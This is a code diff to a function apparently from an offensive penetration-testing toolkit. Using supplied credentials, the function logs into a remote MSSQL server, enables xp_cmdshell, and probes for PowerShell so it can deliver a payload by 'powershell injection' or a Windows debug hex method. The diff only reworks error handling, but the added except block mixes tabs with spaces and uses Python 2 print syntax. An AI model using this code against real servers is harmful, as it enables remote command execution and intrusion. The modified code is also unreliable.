@@ -106,35 +106,35 @@ def deploy_hex2binary(ipaddr, port, username, password):
     mssql.connect()
     mssql.login("master", username, password)
     print_status("Enabling the xp_cmdshell stored procedure...")
-    try:
-        mssql.sql_query(
+    mssql.sql_query(
             "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
-    except:
-        pass
-    print_status("Checking if powershell is installed on the system...")
     # just throw a simple command via powershell to get the output
-    mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
-    bundle = str(capture(mssql.printRows))
-    # remove null byte terminators from capture output
-    bundle = bundle.replace("\\x00", "")
-    # search for parameter version - standard output for powershell -Version
-    # command
-    match = re.search("parameter version", bundle)
-    # if we have a match we have powershell installed
-    if match:
-        print_status("Powershell was detected on the remote system.")
-        option_ps = input(
+    try:
+       mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
+       bundle = str(capture(mssql.printRows))
+       # remove null byte terminators from capture output
+       bundle = bundle.replace("\\x00", "")
+       # search for parameter version - standard output for powershell -Version
+       # command
+       match = re.search("parameter version", bundle)
+       # if we have a match we have powershell installed
+       if match:
+         print_status("Powershell was detected on the remote system.")
+         option_ps = input(
             "Do you want to use powershell injection? [yes/no]:")
-        if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
+         if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
             option = "1"
             print_status("Powershell delivery selected. Boom!")
-        else:
+         else:
             option = "2"
-    # otherwise, fall back to the older version using debug conversion via hex
-    else:
+       # otherwise, fall back to the older version using debug conversion via hex
+       else:
         print_status(
             "Powershell not detected, attempting Windows debug method.")
         option = "2"
+
+    except Exception as err: 
+	print err
 
     # if we don't have powershell
     if option == "2":
